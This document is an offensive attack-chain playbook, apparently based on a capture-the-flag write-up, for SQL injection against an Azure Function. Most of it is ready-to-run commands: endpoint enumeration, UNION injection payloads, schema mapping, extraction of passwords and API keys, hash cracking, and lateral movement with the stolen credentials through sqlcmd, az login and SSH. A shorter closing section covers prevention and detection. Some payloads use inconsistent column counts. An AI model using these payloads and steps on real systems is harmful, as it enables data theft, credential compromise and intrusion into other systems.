# Azure Function SQL Injection to Database Exfiltration

## Chain Summary
**Entry Point:** Identified HTTP-triggered Azure Function with SQL backend  
**Severity:** High  
**Source:** https://kabinet.gitbook.io/ctf-writeup/2025/thuderdome/an-absent-defense

Exploits unvalidated SQL query parameters in Azure Functions to perform UNION-based or blind SQL injection. Enumerates database schema and exfiltrates credentials, configurations, and sensitive data stored in database tables.

---

## Chain: Azure Function Enumeration → SQLi Detection → Schema Enum → Data Exfil

### [1] Azure Function Endpoint Enumeration
- **Trigger:** Target organization uses Azure Functions; function endpoints exposed or discoverable via recon
- **Prereq:** Function URL known or discoverable (subdomain enum, cert transparency logs, cloud storage discovery); HTTP access to function endpoint
- **Method:**
  ```bash
  # Enumerate function URLs via subdomain search (azsubenum, crt.sh, etc.)
  python3 azsubenum.py -d target.com --functions
  
  # Or via Burp/ffuf targeting common function patterns
  ffuf -u "https://target-functions.azurewebsites.net/api/FUZZ" -w functions.txt
  
  # Test common function patterns
  curl -s "https://function-name.azurewebsites.net/api/query?id=1"
  curl -s "https://function-name.azurewebsites.net/api/search?q=test"
  curl -s "https://function-name.azurewebsites.net/api/data?filter=1"
  
  # Identify functions interacting with databases
  # Look for: database queries in responses, error messages mentioning SQL/database
  ```
- **Yields:** Live Azure Function endpoints; identify functions with database interactions (SQL error messages, timing delays, data output)

### [2] SQL Injection Detection & Exploitation (UNION-Based)
- **Trigger:** Function parameter appears injectable; database responds with data or error messages
- **Prereq:** Identified injectable parameter (typically URL query params or POST data); ability to craft SQL queries
- **Method (Basic Detection):**
  ```bash
  # Test for SQL injection with basic payloads
  curl "https://function-name.azurewebsites.net/api/query?id=1'"
  # Look for: SQL syntax errors, stacktraces revealing database type/version
  
  curl "https://function-name.azurewebsites.net/api/query?id=1 AND 1=1"
  # Look for: Same results as id=1 (indicates AND condition works)
  
  curl "https://function-name.azurewebsites.net/api/query?id=1 AND 1=2"
  # Look for: Different results (confirms boolean-based blind SQLi)
  ```

**Method (UNION-Based SQLi):**
  ```bash
  # Determine number of columns
  curl "https://function-name.azurewebsites.net/api/query?id=1 UNION SELECT NULL--"
  # Increment NULL count until no error
  curl "https://function-name.azurewebsites.net/api/query?id=1 UNION SELECT NULL,NULL,NULL--"
  
  # Identify column types (string vs number)
  curl "https://function-name.azurewebsites.net/api/query?id=1 UNION SELECT 1,'string',3--"
  
  # Extract database metadata
  curl "https://function-name.azurewebsites.net/api/query?id=1 UNION SELECT TABLE_NAME,COLUMN_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS--"
  ```
- **Yields:** Confirmation of SQL injection; column count; database type/version; access to INFORMATION_SCHEMA or sys catalog

### [3] Database Schema Enumeration
- **Trigger:** SQL injection confirmed; need to map database structure before data extraction
- **Prereq:** Confirmed UNION-based or blind SQLi; ability to query INFORMATION_SCHEMA or system tables
- **Method:**
  ```bash
  # List all tables in the database
  curl "https://function-name.azurewebsites.net/api/query?id=1 UNION SELECT TABLE_NAME,'---','---' FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_CATALOG='target_db'--"
  
  # For each table, list columns
  TABLE="users"
  curl "https://function-name.azurewebsites.net/api/query?id=1 UNION SELECT COLUMN_NAME,DATA_TYPE,'' FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='$TABLE'--"
  
  # Identify sensitive tables
  # Common tables: users, credentials, secrets, admin, passwords, api_keys, tokens, configurations
  curl "https://function-name.azurewebsites.net/api/query?id=1 UNION SELECT TABLE_NAME,'---' FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE '%user%' OR TABLE_NAME LIKE '%credential%' OR TABLE_NAME LIKE '%secret%'--"
  ```
- **Yields:** Complete database schema; identify tables containing passwords, API keys, secrets, or sensitive configurations

### [4] Credential Table Extraction (via UNION SELECT)
- **Trigger:** Sensitive table identified (e.g., `users`, `credentials`, `secrets`); need to extract plaintext or hashed data
- **Prereq:** Table name and column names known; UNION-based SQLi working; knowledge of output format
- **Method:**
  ```bash
  # Extract user credentials
  curl "https://function-name.azurewebsites.net/api/query?id=1 UNION SELECT id,username,password FROM users--"
  
  # Output: Response body contains extracted rows
  # Example response: 
  # 1 | admin | P@ssw0rd123
  # 2 | user1 | Welcome2025!
  
  # Extract API keys / secrets
  curl "https://function-name.azurewebsites.net/api/query?id=1 UNION SELECT id,api_key,secret_token FROM api_credentials--"
  
  # Extract configuration data (may contain connection strings, API endpoints)
  curl "https://function-name.azurewebsites.net/api/query?id=1 UNION SELECT config_key,config_value FROM application_config--"
  
  # Extract multiple columns concatenated
  curl "https://function-name.azurewebsites.net/api/query?id=1 UNION SELECT id,username,password,email,role FROM users WHERE role='admin'--"
  ```
- **Yields:** Plaintext or weakly hashed credentials; API keys; connection strings; sensitive configuration data

### [5] Password Hash Cracking (If Hashes Extracted)
- **Trigger:** Extracted passwords are hashed (bcrypt, MD5, SHA-1, etc.); need plaintext creds for lateral movement
- **Prereq:** Hash type identifiable; wordlist or sufficient compute; tools: `hashcat`, `john`, online rainbow tables
- **Method:**
  ```bash
  # Identify hash type
  hash_id="$1$...$..."  # Likely MD5 crypt (type 500 in hashcat)
  
  # Crack with hashcat
  hashcat -m 500 hashes.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
  
  # Or use john
  john --format=crypt hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
  ```
- **Yields:** Plaintext passwords for compromised accounts

### [6] Lateral Movement via Extracted Credentials
- **Trigger:** Credentials extracted and cracked (or plaintext); need to access other systems or Azure resources
- **Prereq:** Extracted credentials; target systems identifiable; network access to target
- **Method:**
  ```bash
  # Use database credentials to access backend database directly
  sqlcmd -S <DATABASE_SERVER> -U <extracted_user> -P <extracted_password> -d <DATABASE_NAME>
  # Or: psql -h <DATABASE_SERVER> -U <extracted_user> -W <DATABASE_NAME>
  
  # If extracted credentials are Azure AD users
  az login -u <extracted_upn> -p <extracted_password>
  
  # If extracted API keys are for other Azure services
  export AUTHORIZATION="Bearer $(cat api_key.txt)"
  curl -H "Authorization: $AUTHORIZATION" "https://api.target-service.azurewebsites.net/admin/data"
  
  # If extracted SSH keys or private keys found in config
  ssh -i ./extracted_key.pem admin@target-vm.internal
  ```
- **Yields:** Access to backend database, Azure resources, or additional systems; potential privilege escalation

---

## Mitigation & Detection

**Prevention:**
- **Parameterized Queries:** Always use parameterized/prepared statements, never concatenate user input into SQL queries
  ```csharp
  // GOOD:
  var query = "SELECT * FROM users WHERE id = @id";
  using (var command = new SqlCommand(query, connection))
  {
    command.Parameters.AddWithValue("@id", userInput);
    var result = command.ExecuteReader();
  }
  
  // BAD:
  var query = $"SELECT * FROM users WHERE id = {userInput}";  // SQL injection!
  ```
- **Input Validation:** Whitelist allowed characters/formats for parameters (numbers only, specific strings, etc.)
- **Stored Procedures:** Use stored procedures with input validation instead of dynamic queries
- **Least Privilege:** Database account used by Function should have minimal permissions (no access to INFORMATION_SCHEMA, no DML/DDL rights)
- **Secrets Management:** Never store passwords in database; use Azure Key Vault or Managed Identity for database authentication
- **SQL Error Suppression:** Do NOT expose SQL error messages to users; log errors server-side only

**Detection:**
- **Azure Defender for Databases:** Enable Threat Detection; alerts on SQL injection attempts
- **Azure Application Insights:** Log all Function invocations and SQL queries; alert on:
  - SQL errors or unusual query patterns
  - UNION SELECT or INFORMATION_SCHEMA access
  - Bulk data reads
- **Web Application Firewall (WAF):** Deploy Azure WAF in front of Function endpoints; add SQLi detection rules
- **Database Audit Logs:** Enable SQL Server Audit or PostgreSQL Logging; monitor for:
  - Queries accessing INFORMATION_SCHEMA
  - Unusual query count from same source
  - Extract-heavy queries (ORDER BY, LIMIT)
- **Rate Limiting:** Implement per-IP request throttling on Function endpoints

---

## References
- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- Parameterized Queries (C#): https://docs.microsoft.com/en-us/sql/connect/ado-net-sqlcommand-execute-parameterized-queries
- Azure Defender for Databases: https://learn.microsoft.com/en-us/azure/defender-for-cloud/defender-for-databases-overview
- Azure Function Security Best Practices: https://learn.microsoft.com/en-us/azure/azure-functions/security-concepts
